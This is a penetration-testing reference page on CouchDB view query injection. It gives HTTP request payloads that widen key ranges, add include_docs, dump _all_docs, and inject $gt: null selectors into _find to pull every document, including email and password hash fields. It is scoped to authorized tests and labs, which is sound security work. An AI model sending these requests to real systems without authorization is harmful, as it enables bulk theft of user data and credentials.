---
title: "View query injection in CouchDB"
description: "Manipulating key, startkey, endkey, include_docs, and _all_docs parameters on CouchDB view queries reads documents outside the intended key range."
keywords:
  - CouchDB view query injection
  - startkey endkey
  - include_docs
  - _all_docs
  - key range
  - _find selector
---

# View query injection

Not every CouchDB attack needs a planted function. The view and document-listing API is driven by query-string parameters, and when an application forwards attacker-influenced values into `key`, `startkey`, `endkey`, `include_docs`, or the `_all_docs` and `_find` endpoints, the caller can widen a lookup to read documents outside the range the application intended.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Range parameters

A view query is scoped by key parameters. An application that means to fetch one key may build:

```http
GET /app/_design/d/_view/by_user?key="user:42" HTTP/1.1
```

If the caller controls the key, or the surrounding `startkey`/`endkey`, swapping an exact `key` for an open range returns every row the view holds:

```http
GET /app/_design/d/_view/by_user?startkey="user:"&endkey="user:￰" HTTP/1.1
```

`￰` is a high code point used as an upper bound so the range covers all keys with the prefix. Dropping both bounds returns the whole view, and `descending=true` with swapped bounds is a common way to defeat naive bound checks:

```http
GET /app/_design/d/_view/by_user?descending=true HTTP/1.1
```

## include_docs

By default a view returns the emitted key and value. Adding `include_docs=true` makes CouchDB attach the full source document to each row, which can surface fields the view value deliberately omitted:

```http
GET /app/_design/d/_view/by_user?startkey="user:"&endkey="user:￰"&include_docs=true HTTP/1.1
```

Where an application relied on a view emitting only safe fields, `include_docs=true` reintroduces everything the document contains, including password hashes, tokens, and `_attachments` metadata.

## _all_docs

`_all_docs` is a built-in index of every document `_id` in the database and takes the same range parameters:

```http
GET /app/_all_docs?include_docs=true HTTP/1.1
```

```http
POST /app/_all_docs HTTP/1.1
Content-Type: application/json

{ "keys": ["user:42", "user:43", "config:smtp", "_design/pub"] }
```

With `include_docs=true` this streams every document body in the database, bypassing any view the application exposed as its only intended read path. A `keys` array lets the caller name arbitrary identifiers, including design documents, to pull them directly.

## _find selectors

The Mango `_find` endpoint takes a JSON selector in the request body. When an application merges user input into the selector object, the attacker injects operators that broaden the match, the same operator-injection idea seen in other document stores:

```http
POST /app/_find HTTP/1.1
Content-Type: application/json

{ "selector": { "role": { "$gt": null } }, "limit": 9999 }
```

`{ "$gt": null }` matches every document that has the field, and `{ "_id": { "$gt": null } }` matches all documents. Raising `limit` and adding `"fields"` lets the caller pull large result sets in one request:

```http
POST /app/_find HTTP/1.1
Content-Type: application/json

{ "selector": { "_id": { "$gt": null } }, "fields": ["_id","email","password_hash"], "limit": 100000 }
```

## Probing

Compare a scoped request against one with widened bounds: if `startkey`/`endkey` or a `$gt: null` selector returns more rows than the application's normal view, the parameter is attacker-reachable. A `key` that accepts a JSON array or object where a string was expected, without error, signals the value lands in the query unescaped.

## References

- [Apache CouchDB: View query parameters](https://docs.couchdb.org/en/stable/api/ddoc/views.html)
- [Apache CouchDB: _all_docs](https://docs.couchdb.org/en/stable/api/database/bulk-api.html)
- [Apache CouchDB: _find and Mango selectors](https://docs.couchdb.org/en/stable/api/database/find.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
